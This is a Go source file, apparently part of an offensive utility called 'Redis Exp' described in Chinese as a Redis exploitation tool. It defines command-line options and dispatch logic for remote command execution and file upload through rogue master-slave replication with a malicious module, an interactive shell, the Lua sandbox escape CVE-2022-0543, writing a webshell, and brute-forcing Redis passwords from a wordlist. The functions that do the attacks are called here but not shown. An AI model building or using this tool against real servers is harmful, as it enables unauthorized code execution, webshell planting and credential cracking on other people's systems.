package pkg

import (
	"github.com/urfave/cli/v2"
	"os"
	"strings"
)

var (
	CMD      string
	console  bool
	exec     bool
	upload   bool
	lua      bool
	getshell bool
	brute    bool
	pwdf     string
	PWD      string
)

func Help() {
	app := &cli.App{
		Name:  "Redis Exp",
		Usage: "Redis 利用工具",
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:        "rhost",
				Aliases:     []string{"r"},
				Usage:       "目标IP",
				Destination: &Rhost,
			},
			&cli.StringFlag{
				Name:        "rport",
				Aliases:     []string{"rp"},
				Value:       "6379",
				Usage:       "目标端口",
				Destination: &Rport,
			},
			&cli.StringFlag{
				Name:        "pwd",
				Usage:       "Redis密码",
				Destination: &PWD,
			},
			&cli.StringFlag{
				Name:        "lhost",
				Aliases:     []string{"l"},
				Usage:       "本地IP",
				Destination: &Lhost,
			},
			&cli.StringFlag{
				Name:        "lport",
				Aliases:     []string{"lp"},
				Value:       "21000",
				Usage:       "本地端口",
				Destination: &Lport,
			},
			&cli.StringFlag{
				Name:        "dll",
				Aliases:     []string{"so"},
				Value:       "exp.dll",
				Usage:       "设置 exp.dll | exp.so",
				Destination: &dll,
			},
			&cli.StringFlag{
				Name:        "cmd",
				Aliases:     []string{"c"},
				Usage:       "命令执行",
				Destination: &CMD,
			},
			&cli.BoolFlag{
				Name:        "console",
				Value:       false,
				Usage:       "使用交互式 shell",
				Destination: &console,
			},
			&cli.BoolFlag{
				Name:        "exec",
				Value:       false,
				Usage:       "主从复制命令执行",
				Destination: &exec,
			},
			&cli.BoolFlag{
				Name:        "upload",
				Value:       false,
				Usage:       "主从复制文件上传",
				Destination: &upload,
			},
			&cli.StringFlag{
				Name:        "rpath",
				Aliases:     []string{"path"},
				Usage:       "保存在目标的目录",
				Value:       ".",
				Destination: &Rpath,
			},
			&cli.StringFlag{
				Name:        "rfile",
				Aliases:     []string{"rf"},
				Usage:       "保存在目标的文件名",
				Destination: &Rfile,
			},
			&cli.StringFlag{
				Name:        "lfile",
				Aliases:     []string{"lf"},
				Usage:       "需要上传的文件名",
				Destination: &Lfile,
			},

			&cli.BoolFlag{
				Name:        "lua",
				Value:       false,
				Usage:       "Lua沙盒绕过命令执行 CVE-2022-0543",
				Destination: &lua,
			},

			&cli.BoolFlag{
				Name:        "shell",
				Value:       false,
				Usage:       "备份写 Webshell",
				Destination: &getshell,
			},

			&cli.BoolFlag{
				Name:        "brute",
				Value:       false,
				Usage:       "爆破密码",
				Destination: &brute,
			},
			&cli.StringFlag{
				Name:        "pwdf",
				Usage:       "密码字典",
				Destination: &pwdf,
			},
		},
		Action: func(c *cli.Context) error {
			Run()
			return nil
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		Err(err)
		return
	}
}

func Run() {
	if Rhost == "" {
		Info("靓仔查看下帮助吧")
		os.Exit(0)
	} else {
		err := RedisClient(PWD)
		if err != nil {
			if strings.Contains(err.Error(), "context deadline exceeded") {
				Info("Redis 连接超时")
			}

			//Err(err)

			if strings.Contains(err.Error(), "NOAUTH Authentication required.") {
				Info("Redis 需要密码认证")
			}
			if strings.Contains(err.Error(), "ERR invalid password") {
				Info("Redis 认证密码错误!")
			}
		}

		if err == nil {
			switch {
			case exec:
				if Lhost == "" {
					Info("缺少 Lhost 参数")
					os.Exit(0)
				}
				if console {
					RedisSlave()
					loopCmd("exec")
				} else {
					if CMD == "" {
						Info("缺少 cmd 参数, 无法执行命令哦")
						os.Exit(0)
					}
					RedisSlave()
					RunCmd(CMD)
					CloseSlave("exec")
				}
				break

			case upload:
				if Rfile == "" || Lfile == "" || Lhost == "" {
					Info("rfile | lfile | lhost 参数不能为空")
					os.Exit(0)
				}
				RedisUpload()
				break

			case lua:
				if console {
					loopCmd("lua")
				} else {
					if CMD == "" {
						Info("缺少 cmd 参数, 无法执行命令哦")
						os.Exit(0)
					}
					RedisLua(CMD)
				}
				break

			case getshell:
				GetShell()
				break
			}
		}
	}

	if brute {
		if pwdf == "" {
			Info("缺少字典参数 -pwdf")
			os.Exit(0)
		}
		readPass(pwdf)
		brutePWD()
		os.Exit(0)
	}

}
